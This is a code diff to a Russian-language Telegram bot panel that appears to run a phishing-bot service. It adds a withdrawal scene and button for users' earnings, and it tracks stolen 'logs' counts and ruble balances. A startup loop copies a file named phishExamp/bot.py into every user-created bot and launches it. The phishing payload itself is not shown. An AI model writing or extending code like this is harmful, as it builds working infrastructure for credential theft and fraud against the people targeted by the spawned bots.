@@ -4,7 +4,11 @@ const { token } = require("./config");
 const db = require("./database");
 const cmdStart = require("./botCreatingTools/cmdWorking");
 const axios = require("axios");
+
+// scenes
+
 const createBotScene = require("./scenes/createBotScene");
+const vivodScene = require("./scenes/vivodScene");
 
 // modules import
 
@@ -21,7 +25,7 @@ const fs = require("fs");
 
 const bot = new Telegraf(token);
 
-const stage = new Stage([createBotScene]);
+const stage = new Stage([createBotScene, vivodScene]);
 
 bot.use(session());
 bot.use(stage.middleware());
@@ -83,6 +87,11 @@ bot.hears("👨🏼‍💻Ваш профиль", async (ctx) => {
 
     await ctx.reply(`Ваш профиль\n\nЛогов всего: ${logsAllTime}\nЛогов за месяц: ${logsMonth}\nЛогов за день: ${logsDay}\n\nБаланс: ${balance}₽\nВсего заработано: ${balanceAllTime}₽`, {reply_markup: keyboard})
 });
+
+bot.action("withdraw_money", async (ctx) => {
+    console.log("1")
+    ctx.scene.enter("vivodScene");
+})
 
 bot.hears("Создать бота", async (ctx) => {
     ctx.scene.enter("createBotScene");
@@ -183,6 +192,7 @@ const startBots = new Promise((resolve, reject) => {
      for(directory of directories) {
          if (!fs.existsSync(`./bots/${directory}/bot.py`)) continue;
 
+         console.log(directory)
          fs.writeFileSync(`./bots/${directory}/bot.py`, fs.readFileSync(`./phishExamp/bot.py`));
          cmdWorking(`cd ./bots/${directory} & python bot.py`);
      }
